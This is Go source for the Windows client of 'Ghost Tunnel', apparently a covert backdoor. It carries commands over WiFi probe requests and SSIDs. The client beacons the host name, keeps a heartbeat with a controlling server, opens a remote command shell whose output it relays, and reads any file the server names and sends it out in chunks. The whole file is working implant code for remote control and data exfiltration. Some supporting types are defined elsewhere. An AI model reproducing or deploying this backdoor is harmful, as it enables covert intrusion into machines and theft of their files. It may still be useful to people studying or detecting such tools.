package main

import (
	"container/list"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"time"
)

var (
	apiVersion uint32 = 2
	err        error
)

// WlanAPI call operate system's native WiFi API.
type WlanAPI interface {
	Send(t *TunnelData)
	Receive() *TunnelData
}

// GTClient is Ghost Tunnel Windows Client.
type GTClient struct {
	WlanAPI
	tData     chan *TunnelData
	clientID  uint8
	serverID  uint8
	connected bool
	sendList  *list.List
	shell     Shell
}

// New Windows GTClient.
func New() *GTClient {
	return &GTClient{
		WlanAPI:  InitWinAPI(),
		tData:    make(chan *TunnelData),
		sendList: list.New(),
	}
}

func (c *GTClient) sendConnReq() {
	name, _ := os.Hostname()
	for {
		if !c.connected {
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelConnClientReq,
				payload:  append([]byte{0x06}, []byte(name)...),
			})
		}
		time.Sleep(30 * time.Second)
	}
}

func (c *GTClient) sendHeartBeat() {
	for {
		if c.connected {
			time.Sleep(30 * time.Second)
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelConnHeartBeat,
				clientID: c.clientID,
				serverID: c.serverID,
				payload:  []byte{},
			})
		}
	}
}

func (c *GTClient) handlePacket() {
	go func() {
		for {
			if c.sendList.Len() > 0 {
				v := c.sendList.Front()
				c.Send(v.Value.(*TunnelData))
				c.sendList.Remove(v)
				c.tData <- c.Receive()
				continue
			}
			// make a simple probe-request to refresh ssid list.
			c.Send(nil)
			c.tData <- c.Receive()

		}
	}()

	for t := range c.tData {
		if t != nil {
			switch t.dataType & 0xF0 {
			case TunnelConn:
				c.handleConn(t)
			case TunnelShell:
				c.handleShell(t)
			case TunnelFile:
				c.handleFile(t)
			default:
				break
			}
		}
	}
}

func (c *GTClient) handleConn(t *TunnelData) {
	switch t.dataType {
	case TunnelConnServerResp:
		if !c.connected {
			c.clientID = t.clientID
			c.serverID = t.serverID
			c.connected = true
			fmt.Println("[*] Connected to Server", c.serverID)
		}
	case TunnelConnHeartBeat:
		c.connected = true
		fmt.Println("[*] Received server heartbeat")
	default:
		break
	}
}

func (c *GTClient) handleShell(t *TunnelData) {
	switch t.dataType {
	case TunnelShellInit:
		fmt.Println("[*] Shell init")
		acp := GetOEMCP()
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelShellACP,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  acp,
		})

		c.shell.Init()
		go func() {
			for {
				if res := c.shell.ReadOutput(); len(res) > 0 {
					// chunk
					for len(res) > MaxPayloadLength {
						c.sendList.PushBack(&TunnelData{
							dataType: TunnelShellData,
							clientID: c.clientID,
							serverID: c.serverID,
							payload:  res[:MaxPayloadLength],
						})
						res = res[MaxPayloadLength:]
					}
					c.sendList.PushBack(&TunnelData{
						dataType: TunnelShellData,
						clientID: c.clientID,
						serverID: c.serverID,
						payload:  res,
					})
				}
			}
		}()

	case TunnelShellData:
		fmt.Println(string(t.payload))
		c.shell.Input(string(t.payload) + "\n")

	case TunnelShellQuit:
		fmt.Println("[*] Quit shell")
		os.Exit(0)
	default:
		break
	}
}

func (c *GTClient) handleFile(t *TunnelData) {
	switch t.dataType {
	case TunnelFileGet:
		dat, err := ioutil.ReadFile(string(t.payload))
		if err != nil || len(dat) > 1024*1024*10 {
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelFileError,
				clientID: c.clientID,
				serverID: c.serverID,
				payload:  []byte{},
			})
		}
		fmt.Println("[*] Download", string(t.payload))
		// send file info
		size := make([]byte, 4)
		binary.LittleEndian.PutUint32(size, uint32(len(dat)))
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelFileInfo,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  size,
		})

		// chunk
		for len(dat) > MaxPayloadLength {
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelFileData,
				clientID: c.clientID,
				serverID: c.serverID,
				payload:  dat[:MaxPayloadLength],
			})
			dat = dat[MaxPayloadLength:]
		}
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelFileData,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  dat,
		})

		// file end
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelFileEnd,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  []byte{},
		})
	default:
		break
	}
}

func main() {
	fmt.Println("[*] Start")
	c := New()
	if err != nil {
		fmt.Println(err)
		return
	}
	go c.sendConnReq()
	go c.sendHeartBeat()

	c.handlePacket()
}
